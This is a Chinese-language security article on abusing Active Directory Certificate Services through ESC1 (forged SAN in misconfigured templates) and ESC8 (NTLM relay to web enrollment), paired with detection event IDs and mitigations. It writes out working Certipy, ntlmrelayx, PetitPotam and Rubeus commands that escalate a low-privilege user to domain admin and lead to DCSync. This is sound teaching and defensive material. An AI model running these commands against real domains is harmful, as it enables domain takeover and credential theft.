+++
title = "Active Directory Certificate Services 漏洞利用与防御：ESC1 与 ESC8"
weight = 30
+++

## 0x00 概述

Active Directory Certificate Services (AD CS) 作为微软提供的公钥基础设施 (PKI) 解决方案，在企业环境中被广泛用于身份验证、加密和代码签名等场景。由于其原生与 Active Directory 深度集成，一旦出现配置不当，将直接导致域权限提升。

2021 年，SpecterOps 发布的《Certified Pre-Owned》白皮书系统性地揭露了 AD CS 的多种滥用场景（ESC1 至 ESC8）。本文将结合互联网真实攻防案例，深入剖析最典型且高频利用的 **ESC1（模板配置缺陷导致 SAN 滥用）** 与 **ESC8（Web 注册接口 NTLM 中继）** 攻击手法，并汇总相应的蓝队检测痕迹与处置思路。

---

## 0x01 ESC1: 模板配置缺陷与 SAN 滥用

### 1. 漏洞成因
ESC1 的核心在于证书模板的错误配置。当一个证书模板同时满足以下条件时，攻击者即可利用其进行提权：
- `ENROLLEE_SUPPLIES_SUBJECT` 标志位被启用（允许请求者自定义 Subject Alternative Name, SAN）。
- 模板允许低权限用户（如 `Domain Users` 或 `Authenticated Users`）进行注册。
- 模板的扩展密钥用法 (EKU) 包含客户端身份验证（Client Authentication）、智能卡登录 (Smart Card Logon) 或任何目的 (Any Purpose)。
- 无需 CA 管理员审批（No Manager Approval Required）。

在这种配置下，任意低权限用户在请求证书时，均可在 SAN 字段中指定高权限用户（如 Domain Admin）的 UPN。CA 颁发证书后，攻击者即可使用该证书代表高权限用户向域控请求 TGT 票据。

### 2. 红队利用手法与具体操作

在获取到域内任意普通用户凭证后，攻击者通常使用 `Certify` (C#) 或 `Certipy` (Python) 进行自动化枚举与利用。

**步骤 1：枚举易受攻击的模板**
```bash
# 使用 Certipy (Linux)
certipy find -u lowprivuser@corp.local -p 'Password123!' -dc-ip 10.10.10.1 -vulnerable -stdout

# 使用 Certify (Windows)
Certify.exe find /vulnerable
```

**步骤 2：伪造 SAN 请求证书**
发现名为 `VulnTemplate` 的模板存在 ESC1 缺陷后，以普通用户身份，在请求中将 SAN 指向域管：
```bash
certipy req -u lowprivuser@corp.local -p 'Password123!' -ca 'CORP-CA' -target ca.corp.local -template VulnTemplate -upn administrator@corp.local -dc-ip 10.10.10.1
```
执行成功后，将获得 `administrator.pfx` 证书文件。

**步骤 3：请求 TGT 票据并获取 NTLM Hash**
利用生成的 PFX 证书，通过 PKINIT 协议请求 TGT：
```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```
成功后，Certipy 将返回高权限用户的 NTLM Hash 及 TGT 缓存文件 (`administrator.ccache`)，此时即可使用 Pass-The-Hash 或 Pass-The-Ticket 彻底接管域环境。

### 3. 蓝队防守处置与痕迹分析

**检测思路与 Event ID (EVTX) 提取**：
- **Event ID 4886**：证书服务收到证书请求。
- **Event ID 4887**：证书服务批准并颁发了证书。
  *分析重点*：蓝队需重点排查 4887 日志中 `Requester`（请求者）与 `Subject Alternative Name`（使用者备用名称）不一致的记录。如果发现低权限用户账户请求了包含高权限账户 UPN 的证书，且模板为客户端认证，则为典型的 ESC1 攻击痕迹。
- **Event ID 4768**：请求 Kerberos 身份验证票据 (TGT)。
  *分析重点*：当攻击者使用伪造的证书请求 TGT 时，4768 日志中的 `Certificate Information` 字段会记录使用的证书指纹 (Thumbprint)。通过关联 4887 的颁发记录，可还原攻击链路。

**处置与缓解方案**：
1. **修复模板配置**：在证书模板属性的“请求处理”选项卡中，取消勾选“在请求中提供 (Supply in the request)”，改为从 Active Directory 自动构建。
2. **强制强身份映射**：应用微软 KB5014754 补丁，强制实施强身份映射 (Strong Identity Mapping)。通过检查证书中的 `szOID_NTDS_CA_SECURITY_EXT` 扩展，防止隐式 SAN 映射滥用。
3. **撤销非法证书**：在 CA 服务器上定位被滥用颁发的证书，手动将其吊销 (Revoke)，并更新证书吊销列表 (CRL)。

---

## 0x02 ESC8: Web 注册接口 NTLM 中继

### 1. 漏洞成因
AD CS 提供了多种基于 HTTP 的注册接口（如 Certificate Authority Web Enrollment 角色提供的 `/certsrv` 接口）。默认情况下，这些 IIS 站点支持 NTLM 身份验证，且**未强制开启 EPA (Extended Protection for Authentication)** 或 SMB 签名。
攻击者可以通过强制高权限机器（如域控）向攻击者机器发起 NTLM 认证，随后将该认证流量中继 (Relay) 到 AD CS 的 Web 注册接口，从而以机器账户的身份申请客户端认证证书。

### 2. 红队利用手法与具体操作

**步骤 1：监听与中继配置**
攻击者在本地启动 `ntlmrelayx`，监听传入的 NTLM 流量，并将其指向 CA 服务器的 Web 注册接口，同时指定一个包含客户端认证的模板（通常为默认的 `Machine` 或 `User` 模板）：
```bash
ntlmrelayx.py -t http://ca.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template Machine
```

**步骤 2：强制触发 NTLM 认证**
使用 `PetitPotam` (MS-EFSRPC) 或 `PrinterBug` (MS-RPRN) 强制域控制器向攻击者的机器发起认证：
```bash
python3 PetitPotam.py attacker_ip dc.corp.local
```

**步骤 3：提取 Base64 证书并请求 TGT**
一旦 DC 发起连接，`ntlmrelayx` 将捕获并中继哈希，成功后会在控制台打印出 Base64 编码的机器证书。
随后，攻击者利用 `Rubeus` 使用该 Base64 证书为域控机器账户请求 TGT：
```bash
Rubeus.exe asktgt /user:DC$ /certificate:<Base64_Cert> /ptt
```
获得 DC 机器账户的票据后，攻击者可执行 DCSync 导出整个域的凭证。

### 3. 蓝队防守处置与痕迹分析

**检测思路与 Event ID 提取**：
- **异常的 NTLM 流量**：分析网络流量中的 NTLM Relay 行为。重点关注源 IP 不是目标机器本身，但 NTLM 认证主体却是高权限机器账户的异常连接。
- **Event ID 4887 (CA 服务器)**：排查 HTTP/Web 注册通道申请的证书。如果 `Machine` 模板的证书由意料之外的 IP 提交请求，需高度警惕。
- **Event ID 4624 (CA 服务器)**：关注 Logon Type 3（网络登录）的事件，特别是认证来源 IP 为攻击者主机，但账号为其他机器账户（如 DC$）的情况。

**处置与缓解方案**：
1. **禁用 NTLM 认证**：如果业务允许，在 CA 的 IIS 站点中完全禁用 NTLM，仅保留 Kerberos 身份验证。
2. **启用 EPA (扩展保护)**：在 IIS 管理器中，将 AD CS 虚拟目录的 Windows 身份验证“扩展保护”设置为“必需 (Required)”。
3. **强制启用 HTTPS**：确保 CA Web 注册接口必须通过 HTTPS 访问，从而阻断基于 HTTP 的中继攻击。
4. **过滤 RPC 触发器**：在域控制器上禁用 Print Spooler 服务，并使用 RPC 过滤器限制对 EFS API 的未授权访问，切断强制触发认证的源头。

---

## 0x03 总结

AD CS 作为基础设施的核心信任锚点，其配置缺陷往往被视为“一击必杀”的漏洞。红队在实战中常将 ESC1 与 ESC8 结合其他路径（如 ESC4 修改模板再进行 ESC1 利用）形成攻击链。对于蓝队而言，除了及时安装补丁和修复模板配置外，针对证书颁发日志（4886、4887）及 PKINIT 票据请求日志（4768）的实时聚合分析，是发现此类高级威胁的关键。